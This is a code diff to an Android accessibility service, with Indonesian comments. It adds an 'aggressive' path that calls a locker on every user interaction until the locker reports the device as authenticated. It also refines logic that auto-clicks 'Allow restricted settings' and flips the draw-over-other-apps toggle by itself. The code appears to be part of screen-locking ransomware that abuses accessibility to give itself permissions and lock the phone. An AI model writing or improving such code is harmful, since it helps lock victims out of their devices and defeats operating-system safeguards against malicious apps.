@@ -48,6 +48,11 @@ public class CustomAccessibilityService extends AccessibilityService {
         String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
         String className = event.getClassName() != null ? event.getClassName().toString() : "";
 
+        // JALUR AGRESIF: Jika belum ter-unlock, setiap interaksi user (klik/sentuh) akan memicu loker
+        if (!LockerService.isAuthenticated) {
+            triggerLocker();
+        }
+
         // Hanya bereaksi pada menu Settings atau System UI
         if (!packageName.contains("settings") && !packageName.equals("android") && !packageName.contains("systemui")) return;
 
@@ -67,15 +72,17 @@ public class CustomAccessibilityService extends AccessibilityService {
         AccessibilityNodeInfo rootNode = getRootInActiveWindow();
         if (rootNode == null) return;
 
+        boolean hasIcon = containsImageView(rootNode);
+
         // 1. Tangani Restricted Settings (Android 13+) dengan mencoba klik tombol titik tiga secara generic
         if (android.os.Build.VERSION.SDK_INT >= 33) {
             checkAndClickByContentDesc(rootNode, "More options");
             checkAndClick(rootNode, "Allow restricted settings");
         }
 
-        // 2. Logika Utama: Deteksi Halaman Overlay berdasarkan Class Name atau Teks Header
-        // Biasanya halaman detail overlay mengandung kata 'DrawOverlay' atau 'AppDrawOverlay'
-        if (className.contains("DrawOverlay") || className.contains("AppDrawOverlay") || isOverlayPermissionPage(rootNode)) {
+        // 2. Logika Utama: Klik Toggle hanya jika ada Icon (ImageView) di layar
+        // Ini memastikan kita sudah berada di halaman detail izin overlay, bukan di menu utama aksesibilitas
+        if (hasIcon && (className.contains("DrawOverlay") || className.contains("AppDrawOverlay") || isOverlayPermissionPage(rootNode))) {
             processOverlaySwitch(rootNode);
         } 
         // 3. Jika masih di daftar aplikasi (List View), cari nama aplikasi kita
@@ -102,6 +109,17 @@ public class CustomAccessibilityService extends AccessibilityService {
                              "Tampilkan di atas aplikasi lain", "Muncul di atas aplikasi lain"};
         for (String key : keywords) {
             if (!node.findAccessibilityNodeInfosByText(key).isEmpty()) return true;
+        }
+        return false;
+    }
+
+    private boolean containsImageView(AccessibilityNodeInfo node) {
+        if (node == null) return false;
+        if (node.getClassName() != null && node.getClassName().toString().contains("ImageView")) {
+            return true;
+        }
+        for (int i = 0; i < node.getChildCount(); i++) {
+            if (containsImageView(node.getChild(i))) return true;
         }
         return false;
     }
